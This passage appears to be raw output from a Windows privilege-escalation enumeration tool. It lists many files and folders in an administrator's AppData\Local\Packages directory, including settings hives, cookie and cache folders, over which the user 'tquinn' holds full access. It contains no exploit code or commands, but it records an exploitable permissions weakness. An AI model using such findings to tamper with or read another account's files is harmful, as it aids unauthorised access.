     File Permissions "c:\users\administrator\AppData\Local\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\AC\Temp\mat-debug-10232.log": tquinn [Allow: AllAccess]                                  
     File Permissions "c:\users\administrator\AppData\Local\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\AC\Temp\mat-debug-4148.log": tquinn [Allow: AllAccess]                                   
     File Permissions "c:\users\administrator\AppData\Local\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\AC\Temp\mat-debug-596.log": tquinn [Allow: AllAccess]                                    
     File Permissions "c:\users\administrator\AppData\Local\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\AC\Temp\mat-debug-604.log": tquinn [Allow: AllAccess]                                    
     File Permissions "c:\users\administrator\AppData\Local\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\AC\Temp\mat-debug-9292.log": tquinn [Allow: AllAccess]                                   
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\AC\Temp": tquinn [Allow: AllAccess]                                                    
     File Permissions "c:\users\administrator\AppData\Local\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\AC\Temp\mat-debug-9440.log": tquinn [Allow: AllAccess]                                   
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.WindowsFeedbackHub_8wekyb3d8bbwe\Settings\settings.dat": tquinn [Allow: AllAccess]                                               
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.WindowsFeedbackHub_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                          
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.WindowsFeedbackHub_8wekyb3d8bbwe\Settings\roaming.lock": tquinn [Allow: AllAccess]                                               
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.WindowsMaps_8wekyb3d8bbwe\Settings\settings.dat.LOG2": tquinn [Allow: AllAccess]                                                 
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.WindowsMaps_8wekyb3d8bbwe\Settings\settings.dat.LOG1": tquinn [Allow: AllAccess]                                                 
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.WindowsMaps_8wekyb3d8bbwe\Settings\settings.dat": tquinn [Allow: AllAccess]                                                      
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.WindowsMaps_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                                 
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.WindowsMaps_8wekyb3d8bbwe\Settings\roaming.lock": tquinn [Allow: AllAccess]                                                      
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.WindowsSoundRecorder_8wekyb3d8bbwe\Settings\settings.dat": tquinn [Allow: AllAccess]                                             
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.WindowsSoundRecorder_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                        
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.WindowsSoundRecorder_8wekyb3d8bbwe\Settings\roaming.lock": tquinn [Allow: AllAccess]                                             
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.WindowsStore_8wekyb3d8bbwe\Settings\settings.dat.LOG2": tquinn [Allow: AllAccess]                                                
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.WindowsStore_8wekyb3d8bbwe\Settings\settings.dat.LOG1": tquinn [Allow: AllAccess]                                                
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.WindowsStore_8wekyb3d8bbwe\Settings\settings.dat": tquinn [Allow: AllAccess]                                                     
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.WindowsStore_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                                
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.WindowsStore_8wekyb3d8bbwe\Settings\roaming.lock": tquinn [Allow: AllAccess]                                                     
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Xbox.TCUI_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                                   
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.XboxApp_8wekyb3d8bbwe\Settings\settings.dat": tquinn [Allow: AllAccess]                                                          
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.XboxApp_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                                     
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.XboxApp_8wekyb3d8bbwe\Settings\roaming.lock": tquinn [Allow: AllAccess]                                                          
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.XboxGameCallableUI_cw5n1h2txyewy\Settings\settings.dat": tquinn [Allow: AllAccess]                                               
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.XboxGameCallableUI_cw5n1h2txyewy\Settings": tquinn [Allow: AllAccess]                                                          
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.XboxGameCallableUI_cw5n1h2txyewy\Settings\roaming.lock": tquinn [Allow: AllAccess]                                               
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.XboxGameOverlay_8wekyb3d8bbwe\Settings\settings.dat": tquinn [Allow: AllAccess]                                                  
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.XboxGameOverlay_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                             
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.XboxGameOverlay_8wekyb3d8bbwe\Settings\roaming.lock": tquinn [Allow: AllAccess]                                                  
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.XboxGameOverlay_8wekyb3d8bbwe\LocalState\DiagOutputDir\LogFile_December_11_2024__5_46_37.txt": tquinn [Allow: AllAccess]         
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.XboxGameOverlay_8wekyb3d8bbwe\LocalState\DiagOutputDir": tquinn [Allow: AllAccess]                                             
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.XboxGameOverlay_8wekyb3d8bbwe\LocalState\DiagOutputDir\LogFile_November_4_2024__6_23_34.txt": tquinn [Allow: AllAccess]          
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\Settings\settings.dat": tquinn [Allow: AllAccess]                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                           
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\Settings\roaming.lock": tquinn [Allow: AllAccess]                                                
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.XboxIdentityProvider_8wekyb3d8bbwe\Settings\settings.dat": tquinn [Allow: AllAccess]                                             
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.XboxIdentityProvider_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                        
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.XboxIdentityProvider_8wekyb3d8bbwe\Settings\roaming.lock": tquinn [Allow: AllAccess]                                             
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.XboxSpeechToTextOverlay_8wekyb3d8bbwe\Settings\settings.dat": tquinn [Allow: AllAccess]                                          
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.XboxSpeechToTextOverlay_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                     
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.XboxSpeechToTextOverlay_8wekyb3d8bbwe\Settings\roaming.lock": tquinn [Allow: AllAccess]                                          
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.YourPhone_8wekyb3d8bbwe\SystemAppData\Helium\User.dat": tquinn [Allow: AllAccess]                                                
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.YourPhone_8wekyb3d8bbwe\SystemAppData\Helium\User.dat.LOG1": tquinn [Allow: AllAccess]                                           
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.YourPhone_8wekyb3d8bbwe\SystemAppData\Helium\User.dat.LOG2": tquinn [Allow: AllAccess]                                           
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.YourPhone_8wekyb3d8bbwe\SystemAppData\Helium\UserClasses.dat": tquinn [Allow: AllAccess]                                         
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.YourPhone_8wekyb3d8bbwe\SystemAppData\Helium\UserClasses.dat.LOG1": tquinn [Allow: AllAccess]                                    
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.YourPhone_8wekyb3d8bbwe\SystemAppData\Helium": tquinn [Allow: AllAccess]                                                       
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.YourPhone_8wekyb3d8bbwe\SystemAppData\Helium\UserClasses.dat.LOG2": tquinn [Allow: AllAccess]                                    
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.YourPhone_8wekyb3d8bbwe\Settings\settings.dat.LOG2": tquinn [Allow: AllAccess]                                                   
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.YourPhone_8wekyb3d8bbwe\Settings\settings.dat.LOG1": tquinn [Allow: AllAccess]                                                   
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.YourPhone_8wekyb3d8bbwe\Settings\settings.dat": tquinn [Allow: AllAccess]                                                        
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.YourPhone_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                                   
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.YourPhone_8wekyb3d8bbwe\Settings\roaming.lock": tquinn [Allow: AllAccess]                                                        
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.ZuneMusic_8wekyb3d8bbwe\Settings\settings.dat": tquinn [Allow: AllAccess]                                                        
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.ZuneMusic_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                                   
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.ZuneMusic_8wekyb3d8bbwe\Settings\roaming.lock": tquinn [Allow: AllAccess]                                                        
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.ZuneVideo_8wekyb3d8bbwe\Settings\settings.dat": tquinn [Allow: AllAccess]                                                        
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.ZuneVideo_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                                   
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.ZuneVideo_8wekyb3d8bbwe\Settings\roaming.lock": tquinn [Allow: AllAccess]                                                        
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\Settings": tquinn [Allow: AllAccess]                                                           
     File Permissions "c:\users\administrator\AppData\Local\Packages\MicrosoftWindows.UndockedDevKit_cw5n1h2txyewy\Settings\settings.dat": tquinn [Allow: AllAccess]                                            
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\MicrosoftWindows.UndockedDevKit_cw5n1h2txyewy\Settings": tquinn [Allow: AllAccess]                                                       
     File Permissions "c:\users\administrator\AppData\Local\Packages\MicrosoftWindows.UndockedDevKit_cw5n1h2txyewy\Settings\roaming.lock": tquinn [Allow: AllAccess]                                            
     File Permissions "c:\users\administrator\AppData\Local\Packages\NcsiUwpApp_8wekyb3d8bbwe\Settings\settings.dat": tquinn [Allow: AllAccess]                                                                 
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\NcsiUwpApp_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                                            
     File Permissions "c:\users\administrator\AppData\Local\Packages\NcsiUwpApp_8wekyb3d8bbwe\Settings\roaming.lock": tquinn [Allow: AllAccess]                                                                 
     File Permissions "c:\users\administrator\AppData\Local\Packages\Windows.CBSPreview_cw5n1h2txyewy\Settings\settings.dat": tquinn [Allow: AllAccess]                                                         
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Windows.CBSPreview_cw5n1h2txyewy\Settings": tquinn [Allow: AllAccess]                                                                    
     File Permissions "c:\users\administrator\AppData\Local\Packages\Windows.CBSPreview_cw5n1h2txyewy\Settings\roaming.lock": tquinn [Allow: AllAccess]                                                         
     File Permissions "c:\users\administrator\AppData\Local\Packages\windows.immersivecontrolpanel_cw5n1h2txyewy\Settings\settings.dat": tquinn [Allow: AllAccess]                                              
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\windows.immersivecontrolpanel_cw5n1h2txyewy\Settings": tquinn [Allow: AllAccess]                                                         
     File Permissions "c:\users\administrator\AppData\Local\Packages\windows.immersivecontrolpanel_cw5n1h2txyewy\Settings\roaming.lock": tquinn [Allow: AllAccess]                                              
     File Permissions "c:\users\administrator\AppData\Local\Packages\Windows.PrintDialog_cw5n1h2txyewy\Settings\settings.dat": tquinn [Allow: AllAccess]                                                        
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Windows.PrintDialog_cw5n1h2txyewy\Settings": tquinn [Allow: AllAccess]                                                                   
     File Permissions "c:\users\administrator\AppData\Local\Packages\Windows.PrintDialog_cw5n1h2txyewy\Settings\roaming.lock": tquinn [Allow: AllAccess]                                                        
     File Permissions "c:\users\administrator\AppData\Local\Packages\1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy\Settings\settings.dat": tquinn [Allow: AllAccess]                                       
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy\Settings": tquinn [Allow: AllAccess]                                                  
     File Permissions "c:\users\administrator\AppData\Local\Packages\1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy\Settings\roaming.lock": tquinn [Allow: AllAccess]                                       
     File Permissions "c:\users\administrator\AppData\Local\Packages\c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy\Settings\settings.dat": tquinn [Allow: AllAccess]                                       
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy\Settings": tquinn [Allow: AllAccess]                                                  
     File Permissions "c:\users\administrator\AppData\Local\Packages\c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy\Settings\roaming.lock": tquinn [Allow: AllAccess]                                       
     File Permissions "c:\users\administrator\AppData\Local\Packages\E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy\Settings\settings.dat": tquinn [Allow: AllAccess]                                       
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy\Settings": tquinn [Allow: AllAccess]                                                  
     File Permissions "c:\users\administrator\AppData\Local\Packages\E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy\Settings\roaming.lock": tquinn [Allow: AllAccess]                                       
     File Permissions "c:\users\administrator\AppData\Local\Packages\F46D4000-FD22-4DB4-AC8E-4E1DDDE828FE_cw5n1h2txyewy\Settings\settings.dat": tquinn [Allow: AllAccess]                                       
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\F46D4000-FD22-4DB4-AC8E-4E1DDDE828FE_cw5n1h2txyewy\Settings": tquinn [Allow: AllAccess]                                                  
     File Permissions "c:\users\administrator\AppData\Local\Packages\F46D4000-FD22-4DB4-AC8E-4E1DDDE828FE_cw5n1h2txyewy\Settings\roaming.lock": tquinn [Allow: AllAccess]                                       
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.549981C3F5F10_8wekyb3d8bbwe\Settings\settings.dat": tquinn [Allow: AllAccess]                                                    
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.549981C3F5F10_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                               
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.549981C3F5F10_8wekyb3d8bbwe\Settings\roaming.lock": tquinn [Allow: AllAccess]                                                    
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy\Settings": tquinn [Allow: AllAccess]                                                            
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy\AC\INetCache": tquinn [Allow: AllAccess]                                                        
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy\AC\INetCookies\ESE": tquinn [Allow: AllAccess]                                                  
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy\AC\Microsoft\CryptnetUrlCache\Content": tquinn [Allow: AllAccess]                               
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy\AC\Microsoft\CryptnetUrlCache\MetaData": tquinn [Allow: AllAccess]                              
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.AccountsControl_cw5n1h2txyewy\Settings\settings.dat": tquinn [Allow: AllAccess]                                                  
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.AccountsControl_cw5n1h2txyewy\Settings": tquinn [Allow: AllAccess]                                                             
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.AccountsControl_cw5n1h2txyewy\Settings\roaming.lock": tquinn [Allow: AllAccess]                                                  
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.AsyncTextService_8wekyb3d8bbwe\Settings\settings.dat": tquinn [Allow: AllAccess]                                                 
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.AsyncTextService_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                            
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.AsyncTextService_8wekyb3d8bbwe\Settings\roaming.lock": tquinn [Allow: AllAccess]                                                 
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.BingWeather_8wekyb3d8bbwe\Settings\settings.dat.LOG2": tquinn [Allow: AllAccess]                                                 
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.BingWeather_8wekyb3d8bbwe\Settings\settings.dat.LOG1": tquinn [Allow: AllAccess]                                                 
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.BingWeather_8wekyb3d8bbwe\Settings\settings.dat": tquinn [Allow: AllAccess]                                                      
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.BingWeather_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                                 
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.BingWeather_8wekyb3d8bbwe\Settings\roaming.lock": tquinn [Allow: AllAccess]                                                      
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.BioEnrollment_cw5n1h2txyewy\Settings\settings.dat": tquinn [Allow: AllAccess]                                                    
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.BioEnrollment_cw5n1h2txyewy\Settings": tquinn [Allow: AllAccess]                                                               
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.BioEnrollment_cw5n1h2txyewy\Settings\roaming.lock": tquinn [Allow: AllAccess]                                                    
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.CredDialogHost_cw5n1h2txyewy\Settings\settings.dat": tquinn [Allow: AllAccess]                                                   
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.CredDialogHost_cw5n1h2txyewy\Settings": tquinn [Allow: AllAccess]                                                              
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.CredDialogHost_cw5n1h2txyewy\Settings\roaming.lock": tquinn [Allow: AllAccess]                                                   
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\Settings\settings.dat.LOG2": tquinn [Allow: AllAccess]                                         
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\Settings\settings.dat.LOG1": tquinn [Allow: AllAccess]                                         
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\Settings\settings.dat": tquinn [Allow: AllAccess]                                              
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                         
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\Settings\roaming.lock": tquinn [Allow: AllAccess]                                              
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.ECApp_8wekyb3d8bbwe\Settings\settings.dat": tquinn [Allow: AllAccess]                                                            
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.ECApp_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                                       
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.ECApp_8wekyb3d8bbwe\Settings\roaming.lock": tquinn [Allow: AllAccess]                                                            
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.GetHelp_8wekyb3d8bbwe\Settings\settings.dat": tquinn [Allow: AllAccess]                                                          
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.GetHelp_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                                     
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.GetHelp_8wekyb3d8bbwe\Settings\roaming.lock": tquinn [Allow: AllAccess]                                                          
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Getstarted_8wekyb3d8bbwe\Settings\settings.dat": tquinn [Allow: AllAccess]                                                       
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Getstarted_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                                  
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Getstarted_8wekyb3d8bbwe\Settings\roaming.lock": tquinn [Allow: AllAccess]                                                       
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.HEIFImageExtension_8wekyb3d8bbwe\Settings\settings.dat.LOG2": tquinn [Allow: AllAccess]                                          
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.HEIFImageExtension_8wekyb3d8bbwe\Settings\settings.dat.LOG1": tquinn [Allow: AllAccess]                                          
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.HEIFImageExtension_8wekyb3d8bbwe\Settings\settings.dat": tquinn [Allow: AllAccess]                                               
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.HEIFImageExtension_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                          
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.HEIFImageExtension_8wekyb3d8bbwe\Settings\roaming.lock": tquinn [Allow: AllAccess]                                               
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.LanguageExperiencePacken-GB_8wekyb3d8bbwe\Settings\settings.dat": tquinn [Allow: AllAccess]                                      
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.LanguageExperiencePacken-GB_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                 
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.LanguageExperiencePacken-GB_8wekyb3d8bbwe\Settings\roaming.lock": tquinn [Allow: AllAccess]                                      
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.LockApp_cw5n1h2txyewy\Settings\settings.dat": tquinn [Allow: AllAccess]                                                          
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.LockApp_cw5n1h2txyewy\Settings": tquinn [Allow: AllAccess]                                                                     
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.LockApp_cw5n1h2txyewy\Settings\roaming.lock": tquinn [Allow: AllAccess]                                                          
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Microsoft3DViewer_8wekyb3d8bbwe\Settings\settings.dat": tquinn [Allow: AllAccess]                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Microsoft3DViewer_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                           
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Microsoft3DViewer_8wekyb3d8bbwe\Settings\roaming.lock": tquinn [Allow: AllAccess]                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.MicrosoftEdge.Stable_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                        
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.MicrosoftEdgeDevToolsClient_8wekyb3d8bbwe\Settings\settings.dat": tquinn [Allow: AllAccess]                                      
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.MicrosoftEdgeDevToolsClient_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                 
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.MicrosoftEdgeDevToolsClient_8wekyb3d8bbwe\Settings\roaming.lock": tquinn [Allow: AllAccess]                                      
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\Settings\settings.dat": tquinn [Allow: AllAccess]                                                    
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                               
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\Settings\roaming.lock": tquinn [Allow: AllAccess]                                                    
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe\SystemAppData\Helium\User.dat": tquinn [Allow: AllAccess]                                       
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe\SystemAppData\Helium\User.dat.LOG1": tquinn [Allow: AllAccess]                                  
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe\SystemAppData\Helium\User.dat.LOG2": tquinn [Allow: AllAccess]                                  
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe\SystemAppData\Helium\UserClasses.dat": tquinn [Allow: AllAccess]                                
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe\SystemAppData\Helium\UserClasses.dat.LOG1": tquinn [Allow: AllAccess]                           
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe\SystemAppData\Helium": tquinn [Allow: AllAccess]                                              
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe\SystemAppData\Helium\UserClasses.dat.LOG2": tquinn [Allow: AllAccess]                           
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe\Settings\settings.dat": tquinn [Allow: AllAccess]                                               
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                          
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe\Settings\roaming.lock": tquinn [Allow: AllAccess]                                               
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe\LocalCache\EcsCache0": tquinn [Allow: AllAccess]                                              
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe\LocalCache\EcsCache0\Ecs.dat": tquinn [Allow: AllAccess]                                        
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.MicrosoftSolitaireCollection_8wekyb3d8bbwe\Settings\settings.dat": tquinn [Allow: AllAccess]                                     
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.MicrosoftSolitaireCollection_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.MicrosoftSolitaireCollection_8wekyb3d8bbwe\Settings\roaming.lock": tquinn [Allow: AllAccess]                                     
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\Settings\settings.dat": tquinn [Allow: AllAccess]                                             
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                        
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\Settings\roaming.lock": tquinn [Allow: AllAccess]                                             
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.MixedReality.Portal_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                         
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.MSPaint_8wekyb3d8bbwe\Settings\settings.dat": tquinn [Allow: AllAccess]                                                          
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.MSPaint_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                                     
